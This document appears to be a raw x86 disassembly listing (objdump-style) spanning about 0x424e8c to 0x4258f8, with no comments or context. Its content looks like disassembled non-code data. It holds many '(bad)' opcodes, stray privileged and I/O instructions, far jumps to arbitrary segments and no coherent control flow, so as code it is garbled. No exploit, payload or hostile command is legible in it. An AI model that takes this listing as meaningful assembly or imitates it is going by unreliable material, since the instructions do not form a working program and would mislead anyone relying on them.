  424e8c:	jnp    0x424e0f
  424e8e:	int    0x87
  424e90:	xchg   esi,eax
  424e91:	pop    eax
  424e92:	jmp    0xd36d:0x2b0863ff
  424e99:	mov    ch,0xda
  424e9b:	push   ebp
  424e9c:	mov    esi,0x12e00bd2
  424ea1:	mov    WORD PTR [ecx],gs
  424ea3:	adc    ch,BYTE PTR [esi-0x48]
  424ea6:	popa   
  424ea7:	cmp    ebx,ebp
  424ea9:	or     eax,0x868bfd58
  424eae:	scas   eax,DWORD PTR es:[edi]
  424eaf:	pop    esp
  424eb0:	pop    ebx
  424eb1:	clc    
  424eb2:	sar    BYTE PTR [ebx-0x74],1
  424eb5:	(bad)  
  424eb6:	and    eax,0x41efdd91
  424ebb:	sar    bl,0x2e
  424ebe:	xor    BYTE PTR [edi-0x3c],al
  424ec1:	(bad)  
  424ec2:	fimul  WORD PTR [eax-0x5593af0]
  424ec8:	xor    ch,BYTE PTR [eax+0x16]
  424ecb:	ret    
  424ecc:	ds ins DWORD PTR es:[edi],dx
  424ece:	sbb    DWORD PTR [ecx],edx
  424ed0:	mov    BYTE PTR [ebx-0x2d],al
  424ed3:	hlt    
  424ed4:	mov    bh,0x4c
  424ed6:	and    eax,0x8561e81e
  424edb:	xor    BYTE PTR [eax-0x62],bh
  424ede:	jge    0x424eb8
  424ee0:	push   esp
  424ee1:	push   esp
  424ee2:	mov    esi,?
  424ee4:	dec    esi
  424ee5:	nop    DWORD PTR [ecx+0x6496c9c]
  424eec:	jl     0x424f15
  424eee:	imul   ecx,DWORD PTR [edx+0x14],0x3a
  424ef2:	add    eax,0xc4cbe76a
  424ef7:	add    al,0x58
  424ef9:	retf   0xa088
  424efc:	int3   
  424efd:	mov    bl,0x50
  424eff:	(bad)  
  424f00:	sub    al,0xb5
  424f02:	out    dx,eax
  424f03:	pop    eax
  424f04:	fucomi st,st(1)
  424f06:	add    al,0x9c
  424f08:	inc    eax
  424f09:	aas    
  424f0a:	out    0xd0,eax
  424f0c:	in     al,dx
  424f0d:	call   DWORD PTR [ecx+0x3d]
  424f10:	and    bh,dh
  424f12:	aad    0xb
  424f14:	pop    eax
  424f15:	ret    
  424f16:	inc    esp
  424f17:	jae    0x424f04
  424f19:	pop    ecx
  424f1a:	jbe    0x424f59
  424f1c:	jnp    0x424f13
  424f1e:	(bad)  
  424f1f:	out    dx,eax
  424f20:	ja     0x424f9b
  424f22:	mov    eax,ds:0xd090044
  424f27:	push   0x4d
  424f29:	leave  
  424f2a:	jns    0x424eb5
  424f2c:	pop    ss
  424f2d:	pushf  
  424f2e:	out    dx,al
  424f2f:	and    edi,DWORD PTR [esi-0x7e730064]
  424f35:	mov    DWORD PTR [ebp-0xe],edx
  424f38:	in     eax,0xde
  424f3a:	jmp    0xe7f22ec2
  424f3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f40:	and    BYTE PTR [esi+0x2a9f198f],0xa1
  424f47:	mov    bl,0xdd
  424f49:	dec    edi
  424f4a:	push   0x5fbb7e9e
  424f4f:	ret    
  424f50:	popf   
  424f51:	mov    dl,0x22
  424f53:	adc    eax,0x22d7a1c9
  424f58:	xlat   BYTE PTR ds:[ebx]
  424f59:	add    ebx,DWORD PTR [esi]
  424f5b:	mov    ebp,0xf7fe5d37
  424f60:	and    dh,BYTE PTR [esi+ebx*4]
  424f63:	dec    bp
  424f65:	mov    bl,0xbd
  424f67:	adc    eax,0x104e5ca3
  424f6c:	jo     0x424f81
  424f6e:	mov    esp,ds
  424f70:	mov    al,ds:0xc40f871d
  424f75:	test   DWORD PTR [edx+0x72],0x9fb01c39
  424f7c:	push   esi
  424f7d:	mov    ?,WORD PTR [edx-0x1e]
  424f80:	in     al,0x34
  424f82:	inc    edx
  424f83:	loop   0x424fd1
  424f85:	sub    edx,DWORD PTR ds:0xb0e2e05e
  424f8b:	xor    al,0x8c
  424f8d:	xor    al,0x7d
  424f8f:	js     0x424f91
	...
  424ff1:	add    BYTE PTR [eax],al
  424ff3:	add    BYTE PTR [ebx+0x16],cl
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	idiv   cl
  425002:	dec    edx
  425003:	or     BYTE PTR [edx+ecx*4+0x1040001],dh
  42500a:	add    BYTE PTR [eax],al
  42500c:	jne    0x425088
  42500e:	and    BYTE PTR [edi],ah
  425010:	mov    ecx,0x178f5861
  425015:	sub    DWORD PTR [ebp+0x48d9059c],ebp
  42501b:	out    0x6c,al
  42501d:	adc    esp,ecx
  42501f:	push   ecx
  425020:	(bad)
  425023:	sbb    eax,0x5161da79
  425028:	sub    BYTE PTR [eax-0x1939661e],0x47
  42502f:	jbe    0x4250a2
  425031:	lock xchg edx,eax
  425033:	ret    
  425034:	repnz mov DWORD PTR [ebx+0x28],0xd8be7c01
  42503c:	scas   eax,DWORD PTR es:[edi]
  42503d:	lods   eax,DWORD PTR ds:[esi]
  42503e:	jmp    FWORD PTR [edx]
  425040:	cli    
  425041:	fs xchg ecx,eax
  425043:	xor    BYTE PTR [edi+0x74e0c606],bl
  425049:	ds xor bl,bh
  42504c:	push   es
  42504d:	dec    esp
  42504e:	lock sub eax,0x19384449
  425054:	dec    ebp
  425055:	lods   al,BYTE PTR ds:[esi]
  425056:	mov    al,0x24
  425058:	mov    bh,0x9
  42505a:	xchg   ecx,eax
  42505b:	jmp    0x42505b
  42505d:	pop    edi
  42505e:	cmp    ecx,DWORD PTR [eax+0x2a]
  425061:	push   edi
  425062:	or     BYTE PTR [edx+0x540428d1],cl
  425068:	cmp    BYTE PTR [ecx-0x54e419f5],0x20
  42506f:	not    edx
  425071:	retf   
  425072:	and    DWORD PTR [ebp+edx*1+0x36306c7f],ecx
  425079:	inc    edi
  42507a:	inc    edi
  42507b:	inc    eax
  42507c:	push   edi
  42507d:	shl    DWORD PTR [edi+edi*2],cl
  425080:	add    eax,0xf6055e29
  425085:	out    0x54,eax
  425087:	sub    BYTE PTR [eax],ch
  425089:	shl    BYTE PTR [ecx-0x78],0xb6
  42508d:	(bad)  
  42508e:	js     0x425076
  425090:	adc    al,0x5c
  425092:	push   esp
  425093:	hlt    
  425094:	sub    al,0xb2
  425096:	loopne 0x42505b
  425098:	dec    esp
  425099:	jns    0x425025
  42509b:	mov    ds:0x3ffa1d91,al
  4250a0:	push   es
  4250a1:	or     eax,0x5837aef0
  4250a6:	mov    ecx,0x7dea2ed7
  4250ab:	inc    esi
  4250ac:	cmp    eax,0x1ff7e71d
  4250b1:	fwait
  4250b2:	jb     0x4250c4
  4250b4:	jo     0x425038
  4250b6:	lods   al,BYTE PTR ds:[esi]
  4250b7:	and    eax,0x2b34e9af
  4250bc:	in     al,dx
  4250bd:	xor    edx,esi
  4250bf:	mov    DWORD PTR [eax-0x1a],esi
  4250c2:	push   ebp
  4250c3:	mov    ch,0xea
  4250c5:	call   0x21a20bff
  4250ca:	mov    edx,0x2540c2da
  4250cf:	and    BYTE PTR [eax+eax*4],dl
  4250d2:	(bad)  
  4250d3:	mov    dh,0x36
  4250d5:	jle    0x425087
  4250d7:	fstp   QWORD PTR [edx-0x5ec97a1e]
  4250dd:	ds pop ebx
  4250df:	je     0xccf1031a
  4250e5:	out    0x92,eax
  4250e7:	out    0x24,al
  4250e9:	popf   
  4250ea:	dec    ebx
  4250eb:	jns    0x425100
  4250ed:	jl     0x4250f0
  4250ef:	mov    bh,0xa5
  4250f1:	xor    edx,DWORD PTR [ecx+eiz*1-0x18ac92cc]
  4250f8:	jae    0x425104
  4250fa:	pop    esp
  4250fb:	jo     0x4250dc
  4250fd:	rol    BYTE PTR [ebp+esi*4-0x1],0xc0
  425102:	cmc    
  425103:	(bad)  
  425104:	xor    ecx,edx
  425106:	mov    ecx,0xe040b4cf
  42510b:	(bad)  
  42510c:	xchg   edx,eax
  42510d:	mov    ?,WORD PTR [esi+0xc]
	...
  425174:	ficom  WORD PTR [ecx]
  425176:	lahf   
  425177:	and    ebx,edi
  425179:	scas   eax,DWORD PTR es:[edi]
  42517a:	(bad)  
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0xcedd:0x6cbd92e8
  425184:	mov    eax,0x400018b
  425189:	add    DWORD PTR [eax],eax
  42518b:	add    bh,ch
  42518d:	jno    0x42518a
  42518f:	cli    
  425190:	fdiv   DWORD PTR [ebx]
  425192:	ins    DWORD PTR es:[edi],dx
  425193:	xor    DWORD PTR [edi+0xc],eax
  425196:	sub    al,0xa4
  425198:	or     ah,BYTE PTR [ebx-0x31]
  42519b:	dec    esi
  42519c:	push   ds
  42519d:	sti    
  42519e:	aad    0x7e
  4251a0:	fadd   DWORD PTR [edi-0xb7acba5]
  4251a6:	ins    DWORD PTR es:[edi],dx
  4251a7:	add    eax,0xeb191d68
  4251ac:	mov    ds:0xba8d2326,eax
  4251b1:	in     eax,dx
  4251b2:	mov    ah,0x96
  4251b4:	(bad)  
  4251b5:	sbb    eax,DWORD PTR [esi+0x28ed167c]
  4251bb:	dec    ebp
  4251bc:	cmp    al,0x32
  4251be:	or     DWORD PTR [eax-0x2b],ebx
  4251c1:	(bad)  
  4251c2:	aas    
  4251c3:	mov    bl,0x3a
  4251c5:	out    dx,eax
  4251c6:	add    al,0xac
  4251c8:	aam    0x8b
  4251ca:	inc    ebp
  4251cb:	retf   0xae6b
  4251ce:	retf   0xd3d0
  4251d1:	pop    edi
  4251d2:	popf   
  4251d3:	xor    BYTE PTR [ecx],dh
  4251d5:	inc    esp
  4251d6:	mov    bh,0x1d
  4251d8:	add    DWORD PTR [edx+0x1d],eax
  4251db:	or     edi,esi
  4251dd:	cdq    
  4251de:	hlt    
  4251df:	fldcw  WORD PTR [ecx-0x40]
  4251e2:	add    al,0x1a
  4251e4:	gs dec esp
  4251e6:	aam    0xa2
  4251e8:	cld    
  4251e9:	das    
  4251ea:	mov    al,ds:0xf39324ff
  4251ef:	aaa    
  4251f0:	inc    esp
  4251f1:	fst    QWORD PTR [ebp+0x78]
  4251f4:	add    BYTE PTR [esi+0x364fd5be],dl
  4251fa:	sets   al
  4251fd:	jle    0x4251a9
  4251ff:	call   0x8bb441da
  425204:	add    ecx,edi
  425206:	cwde   
  425207:	imul   ecx,esp,0x3abdca9
  42520d:	aas    
  42520e:	nop
  42520f:	(bad)  
  425210:	or     BYTE PTR [ebp+0x5b96c163],bl
  425216:	sti    
  425217:	aam    0xf2
  425219:	push   ds
  42521a:	push   es
  42521b:	dec    edi
  42521c:	cmp    edi,edi
  42521e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42521f:	fs mul al
  425222:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425223:	jb     0x425224
  425225:	test   BYTE PTR [edi+0x3f],0xca
  425229:	ds pop ss
  42522b:	fimul  WORD PTR [ecx+0x35]
  42522e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42522f:	fwait
  425230:	dec    ebx
  425231:	pop    ds
  425232:	rol    ebp,cl
  425234:	ficom  DWORD PTR [ecx-0x2]
  425237:	(bad)  
  425238:	test   eax,0x787f6e15
  42523d:	ins    DWORD PTR es:[edi],dx
  42523e:	call   0xdd3a:0xaadcde7c
  425245:	leave  
  425246:	(bad)  
  425247:	add    ebx,DWORD PTR [ebx+0x246bc082]
  42524d:	pop    eax
  42524f:	mov    cl,0xf7
  425251:	mov    bl,0xe8
  425253:	mov    edx,eax
  425255:	imul   esp,DWORD PTR ds:0x6e0bace7,0x32
  42525c:	pop    edi
  42525d:	mov    al,0xfa
  42525f:	stc    
  425260:	mov    esp,0x6bdc99d6
  425265:	xor    DWORD PTR [ebp+0x7380da85],esi
  42526b:	xor    ah,BYTE PTR [esi-0x65]
  42526e:	lds    edx,FWORD PTR ds:0xc8514734
  425274:	sbb    esp,DWORD PTR [ebp-0x4e211681]
  42527a:	lods   al,BYTE PTR ds:[esi]
  42527b:	movq   mm4,QWORD PTR [edx-0xb]
  42527f:	lahf   
  425280:	push   cs
  425281:	rcl    esp,cl
  425283:	sbb    al,0x1
  425285:	fs ss push es
  425288:	adc    cl,BYTE PTR [ebp-0x364c33bf]
  42528e:	(bad)  
  42528f:	jle    0x425291
	...
  4252f1:	add    BYTE PTR [eax],al
  4252f3:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	push   0xbc05cfaa
  425305:	mov    WORD PTR [ecx],es
  425307:	add    BYTE PTR [ecx+eax*1],al
  42530a:	add    BYTE PTR [eax],al
  42530c:	push   ss
  42530d:	fbstp  TBYTE PTR [ecx+0x1e19aa23]
  425313:	and    DWORD PTR [edx-0x49f478d4],eax
  425319:	xlat   BYTE PTR ds:[ebx]
  42531a:	add    al,0xcf
  42531c:	and    dl,BYTE PTR [edx]
  42531e:	out    dx,eax
  42531f:	dec    eax
  425320:	xchg   esi,eax
  425321:	lock jg 0x4252d9
  425324:	mov    dl,0xe9
  425326:	mov    esi,0x71ce480d
  42532b:	repz inc ebp
  42532d:	cli    
  42532e:	loop   0x425372
  425330:	bound  ecx,QWORD PTR [ebp-0x2c]
  425333:	les    edi,FWORD PTR [edx-0x72070da7]
  425339:	iret   
  42533a:	pop    edi
  42533b:	fsubr  st(6),st
  42533d:	adc    ebx,DWORD PTR [ebx]
  42533f:	dec    esp
  425340:	leave  
  425341:	scas   eax,DWORD PTR es:[edi]
  425342:	ret    
  425343:	stos   DWORD PTR es:[edi],eax
  425344:	bound  ebp,QWORD PTR [ebp+0x3edecfee]
  42534a:	js     0x4252dc
  42534c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42534d:	cs jo  0x425360
  425350:	xor    al,0xff
  425352:	sbb    ch,BYTE PTR [esi+0x14]
  425355:	or     BYTE PTR [eax+0x65],0x7e
  425359:	fistp  WORD PTR [edx+0x6a]
  42535c:	cmp    ch,bh
  42535e:	mov    ch,0x4f
  425360:	frstor ds:0x5f13e245
  425366:	sbb    ebp,esp
  425368:	mov    bl,0x48
  42536a:	mov    dl,0xd6
  42536c:	pop    ebx
  42536d:	adc    DWORD PTR [eax+ebp*2+0x65],esp
  425371:	pop    ebp
  425372:	sub    DWORD PTR [edi+ecx*2],0xffffff82
  425376:	call   0xe267:0xe5048eb8
  42537d:	cwde   
  42537e:	mov    ah,0x78
  425380:	fisttp DWORD PTR [eax-0x405815da]
  425386:	mov    ah,dh
  425388:	lds    edx,FWORD PTR [eax+0x4e20f6c5]
  42538e:	jmp    0x4253f9
  425390:	adc    al,0x47
  425392:	sub    bh,BYTE PTR es:[edx]
  425395:	xor    eax,0xed846df8
  42539a:	jns    0x42533a
  42539c:	cmc    
  42539d:	xchg   ecx,eax
  42539e:	jno    0x4253c3
  4253a0:	mov    edi,0xde20b980
  4253a5:	or     edx,DWORD PTR gs:[ecx-0x67]
  4253a9:	add    BYTE PTR [ebp+0x3a],dl
  4253ac:	mov    ebx,0x2fc29286
  4253b1:	dec    ebp
  4253b2:	dec    eax
  4253b3:	jp     0x4253a6
  4253b5:	and    bh,dl
  4253b7:	pop    es
  4253b8:	repz push cs
  4253ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4253bb:	clc    
  4253bc:	aam    0x31
  4253be:	mov    ebp,0xf284fcf7
  4253c3:	rol    BYTE PTR [esi+ebp*2+0x54],1
  4253c7:	stos   DWORD PTR es:[edi],eax
  4253c8:	jae    0x4253d0
  4253ca:	inc    esp
  4253cb:	mov    WORD PTR [ebx+0x62188127],gs
  4253d1:	clc    
  4253d2:	pop    edi
  4253d3:	outs   dx,BYTE PTR ds:[esi]
  4253d4:	les    edx,FWORD PTR [ebx-0x6f0f112e]
  4253da:	ret    0x6177
  4253dd:	cld    
  4253de:	adc    eax,0x9b89d67e
  4253e3:	cmp    al,0x28
  4253e5:	jno    0x42536e
  4253e7:	mov    ebp,0xdfcb8a85
  4253ec:	pusha  
  4253ed:	clc    
  4253ee:	ds mov ebx,0x50b3f58c
  4253f4:	js     0x42546f
  4253f6:	arpl   WORD PTR [ebx],dx
  4253f8:	or     al,0xa5
  4253fa:	jno    0x425418
  4253fc:	sbb    al,0xc3
  4253fe:	bnd jg 0x4253f9
  425401:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425402:	push   esi
  425403:	in     eax,0x1b
  425405:	imul   dl
  425407:	jl     0x4253d4
  425409:	or     dl,BYTE PTR [edi+0x6d204767]
  42540f:	mov    edx,0x0
	...
  425474:	inc    edx
  425475:	or     esp,eax
  425477:	test   eax,0xeb6fedcf
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    ebx,DWORD PTR [ecx]
  425481:	sbb    BYTE PTR [esi+0x18dc029],bh
  425487:	add    BYTE PTR [ecx+eax*1],al
  42548a:	add    BYTE PTR [eax],al
  42548c:	in     eax,dx
  42548d:	mov    edx,0x6f35b118
  425492:	shr    ebx,0x7b
  425495:	jae    0x4254ea
  425497:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425498:	gs test eax,0x39b879e0
  42549e:	outs   dx,BYTE PTR ds:[esi]
  42549f:	lahf   
  4254a0:	inc    ebp
  4254a1:	push   esi
  4254a2:	call   0xae2d:0x1f441aa8
  4254a9:	stos   BYTE PTR es:[edi],al
  4254aa:	xchg   esp,eax
  4254ab:	(bad)  
  4254ac:	outs   dx,DWORD PTR ds:[esi]
  4254ad:	xchg   ecx,eax
  4254ae:	fild   DWORD PTR [eax]
  4254b0:	pop    DWORD PTR [ebx]
  4254b2:	pushf  
  4254b3:	mov    ss,WORD PTR [ebx+0x27]
  4254b6:	rdtsc  
  4254b8:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4254ba:	cmp    edi,esi
  4254bc:	xchg   ecx,eax
  4254bd:	dec    eax
  4254be:	jno    0x42551c
  4254c0:	xor    bl,BYTE PTR [ebx]
  4254c2:	sub    al,0x65
  4254c4:	loopne 0x425494
  4254c6:	fld    st(7)
  4254c8:	push   eax
  4254c9:	mov    ebx,0xe357b9d6
  4254ce:	mov    eax,ds:0x203c4e7d
  4254d3:	mov    dl,0xa3
  4254d5:	icebp  
  4254d6:	jns    0x425496
  4254d8:	cmp    bl,BYTE PTR [edi+0x105efa8c]
  4254de:	xchg   edi,eax
  4254df:	int    0xf9
  4254e1:	xor    bh,0xa4
  4254e4:	xor    al,0x53
  4254e6:	push   esi
  4254e7:	jmp    0x42546b
  4254e9:	in     al,dx
  4254ea:	cli    
  4254eb:	push   ds
  4254ec:	mov    ecx,0x8f12e80f
  4254f1:	dec    ebp
  4254f2:	xlat   BYTE PTR ds:[ebx]
  4254f3:	jle    0x42547b
  4254f5:	inc    esi
  4254f6:	push   ss
  4254f7:	aad    0x42
  4254f9:	mov    bl,0x7d
  4254fb:	lahf   
  4254fc:	sar    BYTE PTR [ecx+ecx*1],0x63
  425500:	cwde   
  425501:	outs   dx,DWORD PTR ds:[esi]
  425502:	pop    ds
  425503:	retf   
  425504:	sar    BYTE PTR [ecx+ecx*1+0x63],cl
  425508:	jl     0x425567
  42550a:	mov    dl,0x32
  42550c:	and    DWORD PTR [ecx+0x102d0a8f],eax
  425512:	mov    ch,0x7d
  425514:	test   BYTE PTR [esi+0x15],bl
  425517:	add    ch,BYTE PTR [eax+0x4e]
  42551a:	inc    esi
  42551b:	jle    0x4254b4
  42551d:	mov    WORD PTR [ebx],ss
  42551f:	pop    ds
  425520:	in     al,0xca
  425522:	ret    
  425523:	push   ds
  425524:	mov    edi,0x6ec4fbec
  425529:	pop    esp
  42552a:	mov    BYTE PTR [edi],bh
  42552c:	fisttp QWORD PTR [edx+0x8]
  42552f:	bound  eax,QWORD PTR [esi+0x15]
  425532:	shr    bh,0x50
  425535:	inc    DWORD PTR [esi]
  425537:	imul   ebx,DWORD PTR [edi],0x114f58be
  42553d:	mov    bh,0x9d
  42553f:	int    0x94
  425541:	icebp  
  425542:	xor    eax,0x3dd82e49
  425547:	loopne 0x425576
  425549:	(bad)  [ecx-0x20247976]
  42554f:	mov    bh,0x4d
  425551:	push   ebp
  425552:	stc    
  425553:	cmc    
  425554:	inc    ebp
  425555:	sub    BYTE PTR [ebp-0x5c],bh
  425558:	jecxz  0x425539
  42555a:	mov    eax,ds:0xb262d3bf
  42555f:	sbb    eax,0xd1c5828b
  425564:	push   ebp
  425565:	adc    dh,BYTE PTR [edx-0x92d9fbd]
  42556b:	xchg   edx,edi
  42556d:	outs   dx,BYTE PTR ds:[esi]
  42556e:	cmp    BYTE PTR [ebx-0x13],dl
  425571:	mov    dh,0xb3
  425573:	push   edi
  425574:	xchg   BYTE PTR fs:[ecx+0x11334697],ah
  42557b:	lea    edx,[edi]
  42557d:	jo     0x42558d
  42557f:	adc    al,0xf3
  425581:	push   cs
  425582:	fistp  WORD PTR [edi]
  425584:	dec    esp
  425585:	sub    edx,DWORD PTR fs:[ecx+ebp*1-0x4986a174]
  42558d:	retf   
  42558e:	stos   BYTE PTR es:[edi],al
  42558f:	add    DWORD PTR [eax],eax
	...
  4255f1:	add    BYTE PTR [eax],al
  4255f3:	add    ah,al
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0x92f13a
  425602:	mov    al,0xc6
  425604:	les    ecx,FWORD PTR [esi+0x1040001]
  42560a:	add    BYTE PTR [eax],al
  42560c:	dec    eax
  42560d:	pop    ebx
  42560e:	pop    ecx
  42560f:	mov    edx,ebp
  425611:	(bad)  
  425612:	fild   WORD PTR [ecx-0x71]
  425615:	pop    eax
  425616:	cmp    BYTE PTR [ebx+0x5fdbae14],dl
  42561c:	aam    0x64
  42561e:	cs inc ebp
  425620:	pop    esp
  425621:	gs leave 
  425623:	pop    ds
  425624:	pop    ebx
  425625:	push   ss
  425626:	add    esp,DWORD PTR [ebx-0x16b6bb2b]
  42562c:	jge    0x42562a
  42562e:	jo     0x425626
  425630:	adc    al,0x5d
  425632:	jp     0x4256ab
  425634:	push   esi
  425635:	js     0x4255e3
  425637:	addr16 mov esp,0x8eb67be4
  42563d:	inc    eax
  42563e:	sbb    al,0xef
  425640:	inc    BYTE PTR [ecx+eax*4+0x1b]
  425644:	loopne 0x4256b7
  425646:	je     0x42561f
  425648:	in     eax,0xb3
  42564a:	icebp  
  42564b:	pushf  
  42564c:	or     bh,BYTE PTR [esi]
  42564e:	and    esp,DWORD PTR [edi+0x38]
  425651:	cwde   
  425652:	fdivp  st(7),st
  425654:	(bad)  [edi+0x45]
  425657:	les    edi,FWORD PTR [esi-0x3c]
  42565a:	outs   dx,BYTE PTR ds:[esi]
  42565b:	mov    bl,0x51
  42565d:	mov    dl,0x61
  42565f:	mov    dh,0x83
  425661:	jno    0x42560d
  425663:	in     eax,dx
  425664:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425665:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425666:	mov    ds:0xe87832dd,al
  42566b:	cld    
  42566c:	in     eax,dx
  42566d:	and    DWORD PTR [edx+0x5a],edx
  425670:	mov    bl,0xd6
  425672:	xchg   esp,eax
  425673:	popa   
  425674:	(bad)  
  425676:	es out 0x6e,al
  425679:	dec    ecx
  42567a:	cli    
  42567b:	bound  eax,QWORD PTR ds:0xb51c4286
  425681:	add    BYTE PTR [ecx-0x2d],0x1c
  425685:	aas    
  425686:	inc    ebx
  425687:	xchg   ecx,eax
  425688:	loopne 0x4256d1
  42568a:	add    BYTE PTR [edi-0x66c6008c],ah
  425690:	mov    bh,0xd7
  425692:	push   0x49e9d3e1
  425697:	in     al,dx
  425698:	dec    bl
  42569a:	push   edi
  42569b:	in     al,dx
  42569c:	int3   
  42569d:	loope  0x42566a
  42569f:	inc    ebp
  4256a0:	hlt    
  4256a1:	pushf  
  4256a2:	sub    DWORD PTR [ebp-0x7],eax
  4256a5:	lock and al,0x3c
  4256a8:	adc    dh,BYTE PTR [eax+0x33a4dd7f]
  4256ae:	mov    DWORD PTR [ebx-0x7b7664],0xfa078cd2
  4256b8:	daa    
  4256b9:	dec    edi
  4256ba:	test   BYTE PTR ds:[esi-0xcfa39ec],0x37
  4256c2:	inc    edx
  4256c3:	lods   eax,DWORD PTR ds:[esi]
  4256c4:	push   ebp
  4256c5:	jne    0x425715
  4256c7:	aam    0xe2
  4256c9:	jmp    0xff87:0x7874e
  4256d0:	stos   WORD PTR es:[edi],ax
  4256d2:	test   al,0xb9
  4256d4:	rcl    BYTE PTR [esi+eiz*4+0x4173d508],1
  4256db:	sbb    BYTE PTR [ecx+eax*4-0x1b6194b4],dh
  4256e2:	cdq    
  4256e3:	mov    ?,ecx
  4256e5:	shrd   DWORD PTR fs:[esi-0xe],ebx,cl
  4256ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4256eb:	xchg   ecx,eax
  4256ec:	(bad)  
  4256ed:	fmul   QWORD PTR [edi]
  4256ef:	mov    ds:0xdca53e8c,al
  4256f4:	fcomp  QWORD PTR [ebx]
  4256f6:	and    dl,BYTE PTR [edx+0x76820f9e]
  4256fc:	push   ecx
  4256fd:	mov    al,0xc5
  4256ff:	repz xchg edi,eax
  425701:	sbb    DWORD PTR ds:0x8155c806,edx
  425707:	mov    dh,0xe
  425709:	push   cs
  42570a:	and    DWORD PTR [edx],edi
  42570c:	cs jbe 0x42578c
  42570f:	and    al,0x0
	...
  425771:	add    BYTE PTR [eax],al
  425773:	add    dh,dl
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0x1a2d1074
  425783:	pop    es
  425784:	enter  0x18f,0x0
  425788:	add    al,0x1
  42578a:	add    BYTE PTR [eax],al
  42578c:	mov    ds:0x3ef34558,eax
  425791:	mov    ss:0x9e512839,al
  425797:	cs dec esp
  425799:	inc    esi
  42579a:	or     edx,ebx
  42579c:	imul   ebx,edi,0xffffffe0
  42579f:	sub    eax,0x5f0f2515
  4257a4:	mov    cl,0xc
  4257a6:	(bad)  
  4257a8:	lahf   
  4257a9:	in     al,0x62
  4257ab:	dec    edx
  4257ac:	sub    eax,edx
  4257ae:	or     al,0xec
  4257b0:	push   ebx
  4257b1:	out    dx,eax
  4257b2:	pop    edi
  4257b3:	jge    0x425777
  4257b5:	and    eax,0xdbcf9f08
  4257ba:	popa   
  4257bb:	stos   DWORD PTR es:[edi],eax
  4257bc:	and    BYTE PTR [eax+0x74],bh
  4257bf:	not    BYTE PTR [ebp+0x62522a09]
  4257c5:	pop    esp
  4257c6:	jns    0x4257a8
  4257c8:	iret   
  4257c9:	dec    ebx
  4257ca:	adc    esp,edx
  4257cc:	sub    DWORD PTR [ecx-0xe],ebp
  4257cf:	lods   eax,DWORD PTR ds:[esi]
  4257d0:	(bad)  
  4257d1:	enter  0x29e9,0x60
  4257d5:	out    0x48,eax
  4257d7:	lea    edx,[ebx-0x7b913e0a]
  4257dd:	xchg   BYTE PTR [ebx+0x26],bl
  4257e0:	mov    BYTE PTR [esi-0x6f13ba60],dh
  4257e6:	pop    ebx
  4257e7:	repnz int 0x37
  4257ea:	sbb    ch,ah
  4257ec:	jmp    0x425868
  4257ee:	push   DWORD PTR [esi-0x3d]
  4257f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4257f2:	mov    es,ecx
  4257f4:	xor    bl,BYTE PTR [ecx+0x40]
  4257f7:	retf   
  4257f8:	jmp    0x84a9:0x9d7fb0d6
  4257ff:	fdiv   DWORD PTR [edx+0x76112e72]
  425805:	dec    eax
  425806:	nop
  425807:	xchg   esi,eax
  425808:	xchg   ecx,eax
  425809:	not    BYTE PTR ds:0xebd910b2
  42580f:	inc    ebp
  425810:	pop    ds
  425811:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425812:	out    dx,al
  425813:	es loop 0x42583e
  425816:	pop    ecx
  425817:	arpl   dx,dx
  425819:	lea    ebx,[ecx+0x65d11e47]
  42581f:	mov    al,0x29
  425821:	out    dx,eax
  425822:	and    ebp,ebp
  425824:	cmovb  eax,DWORD PTR [edi-0x167445a7]
  42582b:	ss adc al,0xd9
  42582e:	fistp  DWORD PTR [esi+0x62]
  425831:	(bad)  
  425832:	xor    eax,0x203946fe
  425837:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425838:	fisttp DWORD PTR [eax-0x17]
  42583b:	in     eax,dx
  42583c:	dec    edi
  42583d:	xchg   edx,eax
  42583e:	retf   
  42583f:	std    
  425840:	(bad)  
  425841:	jmp    0x9510484f
  425846:	and    al,0xf3
  425848:	mov    esi,0xc5290d7a
  42584d:	and    BYTE PTR [eax+eiz*4-0x7ddf1439],dh
  425854:	push   0xf7f5a611
  425859:	loope  0x4258d4
  42585b:	mov    DWORD PTR [esi+0x485000bb],ebx
  425861:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425862:	xor    DWORD PTR [ebx+0x4a],0x9e1d8b09
  425869:	pop    edx
  42586a:	ja     0x425804
  42586c:	dec    eax
  42586d:	pop    ds
  42586e:	mov    ebp,0x7d472e0e
  425873:	addr16 xor eax,0xa034400e
  425879:	fcom   DWORD PTR [ebx]
  42587b:	push   ebx
  42587c:	fsubp  st(3),st
  42587e:	popf   
  42587f:	cs pop esi
  425881:	dec    edi
  425882:	fs (bad) 
  425884:	pop    esp
  425885:	and    al,0xdd
  425887:	sbb    dh,BYTE PTR [esi]
  425889:	imul   edi,DWORD PTR [edx-0x7b61f8b5],0xffffffae
	...
  4258f4:	pop    esp
  4258f5:	push   edx
  4258f6:	nop
  4258f7:	push   edx
  4258f8:	sahf   
